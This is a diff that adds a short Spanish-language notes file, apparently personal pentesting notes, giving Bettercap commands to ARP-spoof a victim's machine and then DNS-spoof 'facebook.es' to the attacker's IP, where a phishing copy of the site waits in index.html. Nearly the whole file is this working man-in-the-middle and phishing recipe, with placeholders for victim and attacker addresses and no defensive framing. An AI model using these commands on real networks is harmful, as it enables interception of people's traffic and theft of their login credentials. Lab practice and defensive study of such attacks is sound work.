@@ -1,0 +1,32 @@
+#Para iniciar un ARP Spoofing con Bettercap, haremos lo siguiente:
+
+$ bettercap
+
+$ set arp.spoof.targets <IP_VICTIM>
+
+$ arp.spoof on
+
+#Si miramos las tablas ARP podremos observar que la "MAC" de la direccion del "Router" tiene la misma que la de la maquina atacante
+
+#Tabla ARP en Windows:
+
+$ arp -a
+
+#Tabla ARP en Linux:
+
+$ arp -a
+
+#Si nosotros hacemos alguna solicitud a internet pasara por el atacante.
+
+#Para iniciar un DNS Spoofing con Bettercap antes debemos de tener el ARP Spoofing en funcionamiento, haremos lo siguiente:
+
+#Tambien tendremos que tener en nuestro index.html una pagina web phishing de la URL que vaya a buscar la victima, para que cuando
+#busque dicha URL le rediriga a una pagina exacta
+
+$ set dns.spoof.domains facebook.es
+
+$ set dns.spoof.address <IP_ATTACKER>
+
+$ dns.spoof on
+
+#Ahora cuando el usuario busque "facebook.es" le redirigira a la IP del atacante donde se encuentra la pagina web falsa
